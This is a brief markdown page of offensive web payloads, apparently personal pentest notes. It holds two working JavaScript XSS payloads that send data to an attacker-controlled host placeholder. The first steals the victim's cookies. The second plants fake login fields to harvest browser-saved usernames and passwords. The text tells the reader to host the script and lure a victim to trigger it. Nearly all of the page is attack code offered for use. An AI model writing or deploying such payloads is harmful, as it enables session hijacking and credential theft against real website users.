---
title: Web Payloads
published: true
---

Cookie Stealer:

```js
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://<LHOST-IP>/exfil?data=" + encodedCookie)
```

This code can be hosted in a file called xss.js or something, and just try and have the victim reach the page to trigger it and send you a cookie!


Steal Saved Passwords:

```js
let body = document.getElementsByTagName("body")[0]
var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";
var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
//p.style.opacity = "0";
body.append(u)
body.append(p)

setTimeout(function(){ 
fetch("http://<LHOST-IP>/k?u=" + u.value + "&p=" + p.value)
}, 5000);
```